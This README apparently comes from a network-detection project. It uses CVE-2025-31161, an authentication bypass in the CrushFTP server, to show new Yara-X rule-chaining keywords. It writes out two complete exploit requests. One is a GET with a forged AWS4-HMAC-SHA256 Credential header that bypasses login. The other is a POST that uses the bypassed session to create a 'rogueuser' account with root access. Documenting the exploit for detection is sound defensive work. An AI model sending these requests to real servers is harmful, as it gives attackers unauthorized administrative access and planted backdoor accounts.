# Introduction

This folder contains the PacketSmith [Yara-X detection module rules](https://github.com/Netomize/RFiles/blob/main/cve_2025_31161/crushftp_cve_2025_31161.yar) and a [pcap](cve_2025_31161/crushftp_cve_2025_31161_auth_bypass_rce_traffic.pcap) for the CVE-2025-31161 vulnerability in the CrushFTP server.

This vulnerability was found by [Outpost24](https://outpost24.com/blog/crushftp-auth-bypass-vulnerability/) under the identifier CVE-2025-31161 (previously reported as CVE-2025-2825). Outpost24 and other vendors and security researchers have shared enough technical details about the root cause of the vulnerability and how to exploit it. Public PoCs are already available on GitHub, for example, [CVE-2025-31161 PoC](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

The vulnerability was exploited in the wild by different threat actors, as reported by the [Huntress team](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation).

**N**etomize is taking this as a case study to demonstrate the new **track_state** and **flow_state** keywords we introduced in version 5.3.0 and 5.4.0, in the Yara detection module, for chaining multiple rules across different packets and the same TCP/UDP flows in the pcap, respectively.

# Details

It is an authentication-bypass vulnerability that requires a specially crafted GET request containing a known username (no password is required). The username **crushadmin** is used as the default during setup.

To exploit the vulnerability, a request similar to the following is sent to the vulnerable CrushFTP server (in this case, it was sent against the vulnerable version `11.2.1 Build: 22`):

```
GET /WebInterface/function/ HTTP/1.1
Host: 192.168.60.129:9090
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Cookie: currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

The request shown above is just for authentication bypass and forcing the server to authenticate the session Cookie. The `Authorization` header authentication method is AWS4-HMAC-SHA256, and the Credential is set to the username "crushadmin" (not containing a tilda), followed by `/`. Refer to references 2 and 3 for more info. Of course, you may leak some information from the server in the GET request, depending on the requested command type.

After authenticating the session Cookie with the authentication bypass vulnerability, we may proceed to perform elevated privileges on the CrushFTP server using the same Cookie. For example, we could send a POST request similar to the following to create/add a new user:

```
POST /WebInterface/function/ HTTP/1.1
Host: 192.168.60.129:9090
User-Agent: python-requests/2.32.5
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Cookie: currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Content-Length: 1084
Content-Type: application/x-www-form-urlencoded

command=setUserItem&data_action=replace&serverGroup=MainUsers&username=rogueuser&user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cuser_name%3Erogueuser%3C%2Fuser_name%3E%3Cpassword%3Eroguepass%3C%2Fpassword%3E%3Cextra_vfs+type%3D%22vector%22%3E%3C%2Fextra_vfs%3E%3Cversion%3E1.0%3C%2Fversion%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3CuserVersion%3E6%3C%2FuserVersion%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Csite%3E%28SITE_PASS%29%28SITE_DOT%29%28SITE_EMAILPASSWORD%29%28CONNECT%29%3C%2Fsite%3E%3Ccreated_by_username%3Ecrushadmin%3C%2Fcreated_by_username%3E%3Ccreated_by_email%3E%3C%2Fcreated_by_email%3E%3Ccreated_time%3E1744120753370%3C%2Fcreated_time%3E%3Cpassword_history%3E%3C%2Fpassword_history%3E%3C%2Fuser%3E&xmlItem=user&vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cvfs+type%3D%22vector%22%3E%3C%2Fvfs%3E&permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3CVFS+type%3D%22properties%22%3E%3Citem+name%3D%22%2F%22%3E%28read%29%28view%29%28resume%29%3C%2Fitem%3E%3C%2FVFS%3E&c2f=31If
```

# References

1. [CrushFTP auth bypass vulnerability: Disclosure mess leads to attacks](https://outpost24.com/blog/crushftp-auth-bypass-vulnerability/)
2. [Critical CrushFTP Authentication Bypass (CVE-2025-31161) Exposes Servers to Remote Attacks](https://www.sonicwall.com/blog/critical-crushftp-authentication-bypass-cve-2025-2825-exposes-servers-to-remote-attacks))
3. [CVE-2025-2825](https://attackerkb.com/topics/k0EgiL9Psz/cve-2025-2825/rapid7-analysis)
4. [CrushFTP CVE-2025-31161 Auth Bypass and Post-Exploitation](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation)
5. [CVE-2025-31161 PoC](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)
